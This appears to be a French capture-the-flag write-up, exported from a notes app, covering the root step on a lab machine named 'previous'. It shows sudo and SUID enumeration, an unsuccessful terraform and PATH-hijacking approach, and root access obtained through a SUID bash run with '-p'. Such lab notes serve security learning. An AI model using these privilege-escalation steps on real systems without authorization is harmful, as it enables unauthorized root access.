dir="auto"><h1 id="2c2aa764-c45c-80eb-a8b4-ce3760359583" class="">Root</h1></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-80f6-b4f3-cbbcc173bfde" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">-bash-5.1$ ls
+docker	user.txt
+-bash-5.1$ cat docker/
+cat: docker/: Is a directory
+-bash-5.1$ cd docker/
+-bash-5.1$ ls
+docker-compose.yml  previous
+-bash-5.1$ cat docker-compose.yml 
+services:
+  next:
+    build: previous
+    restart: unless-stopped
+    ports:
+      - &quot;127.0.0.1:3000:3000&quot;
+-bash-5.1$ 
+-bash-5.1$ cd previous/
+-bash-5.1$ ls
+app.json  components  Dockerfile  lib  middleware.ts  next.config.mjs  package.json  package-lock.json	pages  postcss.config.mjs  public  styles  tsconfig.json
+-bash-5.1$ cat Dockerfile 
+# syntax=docker.io/docker/dockerfile:1
+
+FROM node:18-alpine AS base
+
+# Install dependencies only when needed
+FROM base AS deps
+# Check https://github.com/nodejs/docker-node/tree/b4117f9333da4138b03a546ec926ef50a31506c3#nodealpine to understand why libc6-compat might be needed.
+RUN apk add --no-cache libc6-compat
+WORKDIR /app
+
+# Install dependencies based on the preferred package manager
+COPY package.json yarn.lock* package-lock.json* pnpm-lock.yaml* .npmrc* ./
+RUN \
+  if [ -f yarn.lock ]; then yarn --frozen-lockfile; \
+  elif [ -f package-lock.json ]; then npm ci; \
+  elif [ -f pnpm-lock.yaml ]; then corepack enable pnpm &amp;&amp; pnpm i --frozen-lockfile; \
+  else echo &quot;Lockfile not found.&quot; &amp;&amp; exit 1; \
+  fi
+
+
+# Rebuild the source code only when needed
+FROM base AS builder
+WORKDIR /app
+COPY --from=deps /app/node_modules ./node_modules
+COPY . .
+
+# Next.js collects completely anonymous telemetry data about general usage.
+# Learn more here: https://nextjs.org/telemetry
+# Uncomment the following line in case you want to disable telemetry during the build.
+ENV NEXT_TELEMETRY_DISABLED=1
+
+RUN \
+  if [ -f yarn.lock ]; then yarn run build; \
+  elif [ -f package-lock.json ]; then npm run build; \
+  elif [ -f pnpm-lock.yaml ]; then corepack enable pnpm &amp;&amp; pnpm run build; \
+  else echo &quot;Lockfile not found.&quot; &amp;&amp; exit 1; \
+  fi
+
+# Production image, copy all the files and run next
+FROM base AS runner
+WORKDIR /app
+
+ENV NODE_ENV=production
+# Uncomment the following line in case you want to disable telemetry during runtime.
+ENV NEXT_TELEMETRY_DISABLED=1
+
+RUN addgroup --system --gid 1001 nodejs
+RUN adduser --system --uid 1001 nextjs
+
+COPY --from=builder /app/public ./public
+
+# Automatically leverage output traces to reduce image size
+# https://nextjs.org/docs/advanced-features/output-file-tracing
+COPY --from=builder --chown=nextjs:nodejs /app/.next/standalone ./
+COPY --from=builder --chown=nextjs:nodejs /app/.next/static ./.next/static
+
+USER nextjs
+
+EXPOSE 3000
+
+ENV PORT=3000
+
+# server.js is created by next build from the standalone output
+# https://nextjs.org/docs/pages/api-reference/config/next-config-js/output
+ENV HOSTNAME=&quot;0.0.0.0&quot;
+CMD [&quot;node&quot;, &quot;server.js&quot;]</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80c6-b34b-ed5c2c50fbc0" class="">l’app nextjs est hébergée sur un docker exposé sur <a href="http://localhost">localhost</a> 3000 avec redirection de port</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-8027-b452-d58a7bbfe3ca" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">-bash-5.1$ sudo -l
+Matching Defaults entries for jeremy on previous:
+    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply</code></pre></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-8004-8274-e299a3f035b5" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-bash-5.1$ find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null
+-rwsr-xr-x 1 root root 40496 Feb  6  2024 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 72072 Feb  6  2024 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 55680 Apr  9  2024 /usr/bin/su
+-rwsr-xr-x 1 root root 35200 Apr  9  2024 /usr/bin/umount
+-rwsr-xr-x 1 root root 44808 Feb  6  2024 /usr/bin/chsh
+-rwsr-xr-x 1 root root 35200 Mar 23  2022 /usr/bin/fusermount3
+-rwsr-xr-x 1 root root 232416 Jun 25 12:48 /usr/bin/sudo
+-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash
+-rwsr-xr-x 1 root root 59976 Feb  6  2024 /usr/bin/passwd
+-rwsr-xr-x 1 root root 47488 Apr  9  2024 /usr/bin/mount
+-rwsr-xr-x 1 root root 72712 Feb  6  2024 /usr/bin/chfn
+-rwsr-xr-- 1 root messagebus 35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 338536 Apr 11  2025 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1</code></pre></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-80a4-b311-cfefbd021a64" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">-bash-5.1$ /usr/bin/terraform 
+Usage: terraform [global options] &lt;subcommand&gt; [args]
+
+The available commands for execution are listed below.
+The primary workflow commands are given first, followed by
+less common or more advanced commands.
+
+Main commands:
+  init          Prepare your working directory for other commands
+  validate      Check whether the configuration is valid
+  plan          Show changes required by the current configuration
+  apply         Create or update infrastructure
+  destroy       Destroy previously-created infrastructure
+
+All other commands:
+  console       Try Terraform expressions at an interactive command prompt
+  fmt           Reformat your configuration in the standard style
+  force-unlock  Release a stuck lock on the current workspace
+  get           Install or upgrade remote Terraform modules
+  graph         Generate a Graphviz graph of the steps in an operation
+  import        Associate existing infrastructure with a Terraform resource
+  login         Obtain and save credentials for a remote host
+  logout        Remove locally-stored credentials for a remote host
+  metadata      Metadata related commands
+  modules       Show all declared modules in a working directory
+  output        Show output values from your root module
+  providers     Show the providers required for this configuration
+  refresh       Update the state to match remote systems
+  show          Show the current state or a saved plan
+  stacks        Manage HCP Terraform stack operations
+  state         Advanced state management
+  taint         Mark a resource instance as not fully functional
+  test          Execute integration tests for Terraform modules
+  untaint       Remove the &#x27;tainted&#x27; state from a resource instance
+  version       Show the current Terraform version
+  workspace     Workspace management
+
+Global options (use these before the subcommand, if any):
+  -chdir=DIR    Switch to a different working directory before executing the
+                given subcommand.
+  -help         Show this help output or the help for a specified subcommand.
+  -version      An alias for the &quot;version&quot; subcommand.</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-809c-840c-e238c275a5ca" class="">Recherche d'informations sur terraform (du go)</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-801f-b61b-c4f7462a05f3" class="">je ne peux donc faire que</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-8070-8ab7-cf71b1fdce2a" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">/usr/bin/sudo /usr/bin/terraform -chdir\=/opt/examples apply</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8015-9a73-e390332dee9f" class=""><a href="https://developer.hashicorp.com/terraform/cli/commands/apply">https://developer.hashicorp.com/terraform/cli/commands/apply</a></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8094-a693-e897eb54452a" class="">je me cd vers le repertoire ou je peux faire ca</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-80c4-8f49-dcee8e19897c" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-bash-5.1$ pwd
+/opt/examples
+-bash-5.1$ ls -la
+total 28
+drwxr-xr-x 3 root root 4096 Dec  7 16:09 .
+drwxr-xr-x 5 root root 4096 Aug 21 20:09 ..
+-rw-r--r-- 1 root root   18 Apr 12  2025 .gitignore
+-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
+drwxr-xr-x 3 root root 4096 Aug 21 20:09 .terraform
+-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
+-rw-r--r-- 1 root root 1097 Dec  7 16:09 terraform.tfstate
+-bash-5.1$ cat main.tf 
+terraform {
+  required_providers {
+    examples = {
+      source = &quot;previous.htb/terraform/examples&quot;
+    }
+  }
+}
+
+variable &quot;source_path&quot; {
+  type = string
+  default = &quot;/root/examples/hello-world.ts&quot;
+
+  validation {
+    condition = strcontains(var.source_path, &quot;/root/examples/&quot;) &amp;&amp; !strcontains(var.source_path, &quot;..&quot;)
+    error_message = &quot;The source_path must contain &#x27;/root/examples/&#x27;.&quot;
+  }
+}
+
+provider &quot;examples&quot; {}
+
+resource &quot;examples_example&quot; &quot;example&quot; {
+  source_path = var.source_path
+}
+
+output &quot;destination_path&quot; {
+  value = examples_example.example.destination_path
+}</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80f4-9e87-f56249c989aa" class=""><a href="https://developer.hashicorp.com/terraform/cli/config/config-file">https://developer.hashicorp.com/terraform/cli/config/config-file</a></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80a7-97ef-f93069db0016" class="">je regarde si le main a une misconf qui permettrait une rce</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80a5-b087-c0f1d9853f4b" class="">aucun</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80da-9141-e3a8397aba60" class="">Si je veux utiliser terraform apply je dois avoir un fichier exploit avec rce dedans (ou directement un cat flag)</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80ee-8cbc-c3af49bb024c" class="">je n’ai pas les droits d’écriture sur les fichiers interessants</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8092-b0ed-f9bb955a9d16" class="">je ne peux pas non plus creer un fichier ici pourtant c’est le seul endroit ou je peux sudo</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80ea-911c-e765d6506191" class=""><a href="https://stackoverflow.com/questions/73815171/execute-bash-script-on-ubutnu-using-terraform">https://stackoverflow.com/questions/73815171/execute-bash-script-on-ubutnu-using-terraform</a></p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-803f-8ada-ce32f8926284" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Source - https://stackoverflow.com/a
+# Posted by Maaz A. malik
+# Retrieved 2025-12-07, License - CC BY-SA 4.0
+
+resource &quot;aws_instance&quot; &quot;web&quot; {
+  # ...
+
+  provisioner &quot;local-exec&quot; {
+    command = &quot;echo ${self.private_ip} &gt;&gt; private_ips.txt&quot;
+  }
+}</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80ae-b2cd-e813e9de4e53" class="">Tentative de une path hijacking pour mettre mon payload dans <code>/tmp</code> puis export path </p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80ec-94c0-f6ec11ea7ab3" class="">sauf que sudo a une protection anti path hijacking</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-805e-858d-dfe1de9ba526" class="">bon c’est pas la bonne issue je retourne a mes commandes </p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80e8-9b02-f524a44d98e1" class="">(merci l’oscp) <a href="https://medium.com/@saintlafi/linux-privilege-escalation-for-oscp-and-beyond-cheat-sheet-24fb9fe13058">https://medium.com/@saintlafi/linux-privilege-escalation-for-oscp-and-beyond-cheat-sheet-24fb9fe13058</a></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-805b-9ac6-c1d12cf3cbe2" class=""><a href="Previous%202c1aa764c45c80fcb7f4e3eb5dd5abaf.html">tout a l’heure </a></p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80fb-be1d-f3ea8be6ca30" class="">j’apprends actuellement que c’est pas normal</p></div><div style="display:contents" dir="auto"><pre id="2c2aa764-c45c-8096-b398-dff9efa2fb3b" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash</code></pre></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-805c-bc53-d52e4fc908da" class="">la je peux l’executer directemment et ca fa le faire en tant que root mddrr</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-8054-80a4-cfcb0e3ab223" class="">je dois trouver un moyens de convertir cette info en shell</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80b8-8b6d-c043911d7497" class="">de ce que j’ai compris</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80e0-8300-fa44e034dfac" class="">Normalement, si <code>/bin/bash</code> est exécuté avec les privilèges suid (donc que l’utilisateur effectif est pas le meme que le vrai user) le suid est rétrogradé et il s’execute finalement en tant que l’user réel.</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80b0-a83c-fd8ccb2bc27c" class="">-p permet de ne pas faire ca (<code>/bin/bash -p</code>)</p></div><div style="display:contents" dir="auto"><p id="2c2aa764-c45c-80bc-b41b-f2cdb9e58353" class="">et je suis root</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div></div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
